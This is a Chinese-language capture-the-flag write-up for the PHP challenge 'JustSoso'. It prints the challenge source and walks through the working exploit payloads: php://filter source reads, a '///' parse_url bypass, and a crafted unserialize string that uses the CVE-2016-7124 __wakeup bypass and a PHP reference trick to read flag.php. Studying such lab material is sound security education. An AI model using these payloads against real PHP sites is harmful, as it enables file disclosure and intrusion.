# JustSoso

## 操作内容

### 第一步 php伪协议文件读取`index.php`、`hint.php`文件

`index.php?file=php://filter/convert.base64-encode/resource=index.php`
`index.php?file=php://filter/convert.base64-encode/resource=hint.php`

index.php：

```php
<html>
<?php
error_reporting(0); 
$file = $_GET["file"]; 
$payload = $_GET["payload"];
if(!isset($file)){
	echo 'Missing parameter'.'<br>';
}
if(preg_match("/flag/",$file)){
	die('hack attacked!!!');
}
@include($file);
if(isset($payload)){  
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query'],$query);
    foreach($query as $value){
        if (preg_match("/flag/",$value)) { 
    	    die('stop hacking!');
    	    exit();
        }
    }
    $payload = unserialize($payload);
}else{ 
   echo "Missing parameters"; 
} 
?>
<!--Please test index.php?file=xxx.php -->
<!--Please get the source of hint.php-->
</html>
```

hint.php：

```php
<?php  
class Handle{ 
    private $handle;  
    public function __wakeup(){
		foreach(get_object_vars($this) as $k => $v) {
            $this->$k = null;
        }
        echo "Waking up\n";
    }
	public function __construct($handle) { 
        $this->handle = $handle; 
    } 
	public function __destruct(){
		$this->handle->getFlag();
	}
}

class Flag{
    public $file;
    public $token;
    public $token_flag;
 
    function __construct($file){
		$this->file = $file;
		$this->token_flag = $this->token = md5(rand(1,10000));
    }
    
	public function getFlag(){
		$this->token_flag = md5(rand(1,10000));
        if($this->token === $this->token_flag)
		{
			if(isset($this->file)){
				echo @highlight_file($this->file,true); 
            }  
        }
    }
}
?>
```

### 第二步 parse_url /// 绕过flag限制

由于肯定要去读flag文件，要绕过flag的限制
官方文档特意说明：本函数不能用于相对 URL。 

对于畸形url会返回null
可以利用这一点，通过waf

///过waf 直接返回url

`///index.php?`

### 第三步 php反序列化绕过Handle 的 `__wakeup()`

hint.php 两个类
`unserialize($payload);`
肯定是反序列化，先让file文件引入hint.php
`///index.php?file=hint.php`

构造payload：
+ Handle中的handle变量是 private属性
    + s:14:`"%00Handle%00handle"`
+ 目的是把$this->handle 变为Flag对象
    + O:4:`"Flag":3:{...}`
+ 需要绕过__wakeup函数
    + 当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)
    + O:6:`"Handle":2:{...}`

组合：`///index.php?file=hint.php&payload=O:6:"Handle":2:{s:14:"%00Handle%00handle";O:4:"Flag":3:{...}}`

### 第四步 使用 指针 绕过 `===`

+ 目的为了在`echo @highlight_file($this->file,true);`读取flag.php
    + s:4:"file";s:8:"flag.php"
+ 绕过`$this->token === $this->token_flag`
    + 在上一句对$this->token_flag = md5(rand(1,10000));进行了赋值
    + 使用引用绑定token和token_flag
    + $flag-> token = & $flag -> token_flag
    + 生成`s:5:"token";N;s:10:"token_flag";R:4;`


生成payload雏形

```php
$b = new Flag("flag.php");
$b->token_flag = null;
$a = new Handle($b);
$b->token = & $b->token_flag ;
echo serialize($a);
```

修改：`///index.php?file=hint.php&payload=O:6:"Handle":2:{s:14:"%00Handle%00handle";O:4:"Flag":3:{s:4:"file";s:8:"flag.php";s:5:"token";N;s:10:"token_flag";R:4;}}`

